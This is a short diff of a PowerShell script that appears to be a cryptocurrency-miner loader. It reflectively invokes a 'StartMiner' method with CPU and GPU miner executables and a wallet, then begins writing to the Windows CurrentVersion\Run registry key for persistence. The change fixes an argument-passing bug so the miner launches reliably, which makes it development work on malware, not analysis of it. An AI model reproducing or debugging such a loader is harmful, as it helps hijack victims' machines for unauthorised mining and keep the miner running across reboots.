@@ -51,10 +51,11 @@ try {
     $loader = $assembly.GetType("DateFundLoader")
     $startMethod = $loader.GetMethod("StartMiner")
     
-    $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
+    $GpuArg = if ($GpuDetected) { [string]$GpuExe } else { "" }
     Write-Host "[*] Invoking Miner Process..."
-    # Passing arguments separated by commas bypasses the array casting bug in PS
-    $startMethod.Invoke($null, @("$CpuExe", "$GpuArg", "$Wallet"))
+    # Force everything into raw strings to kill the PSObject conversion bug for good
+    $p = [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet)
+    $startMethod.Invoke($null, $p)
     
     Write-Host "[*] Hooking Registry..."
     $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
